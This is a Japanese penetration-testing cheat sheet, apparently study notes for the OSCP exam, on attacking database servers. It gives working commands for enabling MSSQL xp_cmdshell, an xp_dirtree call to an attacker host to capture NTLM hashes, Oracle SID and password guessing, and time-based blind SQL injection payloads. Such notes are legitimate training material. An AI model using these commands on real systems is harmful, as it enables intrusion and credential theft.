# Server - Database

データベース（MSSQL、Oracle、MySQL等）に特化したペネトレーションテストの調査ロジックとコマンド例を、OSCP試験や実戦での活用を想定してまとめました。

## 1. MSSQL (Microsoft SQL Server) - Port 1433

Windows環境のActive Directory攻撃において最も頻出するデータベースです。

- **偵察と列挙 (Enumeration):**
    
    - **Nmapによる詳細調査:**
        
        - `nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info <Target>` 。これにより、インスタンス名、バージョン、およびドメイン名が特定できます。
            
    - **NetExec (nxc) による一括チェック:**
        
        - `nxc mssql <Target> -u 'sa' -p 'password' -M mssql_priv` 。ログイン可能か、および現在の特権（sysadmin等）を確認します。
            
- **OSコマンド実行 (RCE):**
    
    - **xp_cmdshellの悪用:**
        
        - 特権がある場合、OSコマンドを実行できます。
            
        - 手順: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;` 。
            
        - 実行例: `EXEC xp_cmdshell 'whoami';` 。
            
- **認証情報の窃取:**
    
    - **xp_dirtree によるNTLMハッシュ奪取:**
        
        - `EXEC master..xp_dirtree '\\<Attacker_IP>\share';` を実行し、接続してきたハッシュを攻撃側の `Responder` 等でキャプチャします 。
            

## 2. Oracle Database - Port 1521

複雑な構成を持ちますが、`ODAT` ツールを活用することで効率的に調査できます。

- **SID（システム識別子）の特定:**
    
    - 接続には「SID」が必要です。
        
    - `odat sidguesser -s <Target> -p 1521` 。
        
    - Nmapスクリプト: `nmap --script oracle-sid-brute -p 1521 <Target>` 。
        
- **資格情報の特定:**
    
    - `odat passwordguesser -s <Target> -d <SID> -U users.txt -P passwords.txt` 。
        
- **SQLクエリによる内部調査:**
    
    - **バージョン確認:** `SELECT banner FROM v$version;` 。
        
    - **特権確認:** `SELECT * FROM session_privs;` 。
        
- **OSシェル取得:**
    
    - `dbms_scheduler` を利用して実行ファイルを起動し、リバースシェルを確立します 。
        

## 3. Webアプリケーション経由のSQLインジェクション (SQLi)

入力フォーム等からバックエンドDBを操作する攻撃手法です。

- **データベースエンジンの特定:**
    

|**DB種類**|**バージョン確認クエリ**|
|---|---|
|**MSSQL**|`SELECT @@version`|
|**Oracle**|`SELECT banner FROM v$version`|
|**PostgreSQL**|`SELECT version()`|
|**MySQL**|`SELECT @@version`|

- **ブラインド攻撃（時間遅延）による検証:**
    
    - **MSSQL:** `IF (1=1) WAITFOR DELAY '0:0:10'` 。
        
    - **MySQL:** `SELECT IF(1=1, SLEEP(10), 'a')` 。
        
    - **Oracle:** `SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` 。
        

## 4. データベース関連ツールとリソース

|**ツール名**|**公式リンク / Gitリポジトリ**|**主な用途**|
|---|---|---|
|**sqlmap**|[github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)|SQLiの自動検出およびデータ抽出。|
|**ODAT**|[github.com/quentinhardy/odat](https://github.com/quentinhardy/odat)|Oracle DB専用の攻撃・調査スイート。|
|**NetExec (nxc)**|[github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)|MSSQLの列挙、パスワードスプレー、RCE。|
|**Impacket**|[github.com/fortra/impacket](https://github.com/fortra/impacket)|`mssqlclient.py` を用いたMSSQLへの対話的接続。|
|**HackTricks (DB)**|[book.hacktricks.xyz](https://book.hacktricks.xyz/)|各DBの脆弱性調査に関する百科事典。|

### 5. 調査チェックリスト

- [ ] **デフォルト認証:** `sa` (MSSQL) や `system` (Oracle) 等のデフォルトパスワードを試行したか？
    
- [ ] **空パスワード:** Nmapスクリプトで空パスワードの有無を確認したか？
    
- [ ] **リンクサーバー:** 他のDBサーバーへの信頼関係（Link Server）が悪用できないか？
    
- [ ] **データ漏洩:** `xp_dirtree` を使用して、サービスアカウントのNTLMハッシュを収集できないか？
    
- [ ] **バックアップファイル:** SMB共有等に `.bak` や `.sql` ファイルが放置されていないか？